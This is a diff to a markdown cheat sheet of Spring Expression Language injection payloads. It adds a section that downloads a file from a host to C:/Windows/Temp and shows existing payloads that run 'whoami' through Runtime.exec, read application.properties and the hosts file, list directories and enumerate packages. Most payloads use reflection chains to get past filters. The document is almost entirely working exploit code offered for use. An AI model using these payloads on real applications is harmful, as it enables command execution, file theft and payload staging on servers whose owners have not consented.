@@ -21,6 +21,7 @@ T(java.lang.System).getProperties().toString()
 ## Spring properties
 ```Java
 T(org.springframework.core.io.support.PropertiesLoaderUtils).loadAllProperties("application.properties").toString()
+
 "".getClass().forName("org.springframework.core.io.support.PropertiesLoaderUtils").getMethod("loadAllProperties","".getClass()).invoke("","application.properties").toString()
 ```
 
@@ -34,12 +35,20 @@ T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
 "".getClass().forName("java.io.File").getConstructor("".getClass()).newInstance("C:/Windows").listFiles()
 ```
 
+## Download files
+```java
+T(java.nio.file.Files).copy(new java.net.URL("http://127.0.0.1:8888/test.txt").openStream(),"".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke(null,"C:/Windows/Temp/test3.txt",new String[]{}))
+```
+
 ## Read Files (Strings)
 ```java
 // this one may not work beacuse of difference of java.nio.file.Paths.Get arguments from java to java
 "".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke("","".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke("","",new String[]{"C:/Windows/System32/drivers/etc/hosts"}))
+
 "".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/System32/drivers/etc/hosts")))
+
 "".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
+
 T(java.nio.file.Files).readAllLines("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
 ```
 
@@ -47,8 +56,11 @@ T(java.nio.file.Files).readAllLines("".getClass().forName("java.nio.file.Paths")
 ```java
 // this one may not work beacuse of difference of java.nio.file.Paths.Get arguments from java to java
 "".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke("","".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke("","",new String[]{"C:/Windows/System32/drivers/etc/hosts"}))
+
 "".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/System32/drivers/etc/hosts")))
+
 "".getClass().forName("java.nio.file.Files").getMethod("readAllBytes","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
+
 T(java.nio.file.Files).readAllBytes("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
 
 ```
@@ -68,6 +80,7 @@ T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMet
 ## List packages
 ```java
 T(java.util.Arrays).toString("".getClass().forName("java.lang.Package").getMethod("getPackages").invoke(""))
+
 "".getClass().forName("java.util.Arrays").getMethod("toString","".getClass().forName("[Ljava.lang.Object;") ).invoke("","".getClass().forName("java.lang.Package").getMethod("getPackages").invoke("")).toString()
 ```
 
